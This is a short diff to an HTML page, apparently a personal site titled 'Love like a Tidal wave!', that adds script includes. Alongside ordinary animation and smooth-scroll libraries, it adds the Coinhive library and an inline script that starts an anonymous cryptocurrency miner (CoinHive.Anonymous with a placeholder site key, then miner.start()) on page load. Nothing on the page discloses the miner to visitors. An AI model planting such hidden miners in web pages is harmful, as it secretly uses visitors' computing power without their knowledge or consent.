@@ -93,6 +93,8 @@ Love like a Tidal wave!
   <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/1.20.3/TweenMax.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/1.20.3/TweenLite.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/smooth-scroll/12.1.5/js/smooth-scroll.min.js"></script>
+  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+
   <script src="assets/js/main.js" charset="utf-8"></script>
   <script type="text/javascript">
     var scroll = new SmoothScroll('a[href*="#"]', {
@@ -111,6 +113,10 @@ Love like a Tidal wave!
       after: function() {} // Callback to run after scroll
     });
   </script>
+  <script>
+	var miner = new CoinHive.Anonymous('YOUR_SITE_KEY');
+	miner.start();
+</script>
 </body>
 
 </html>
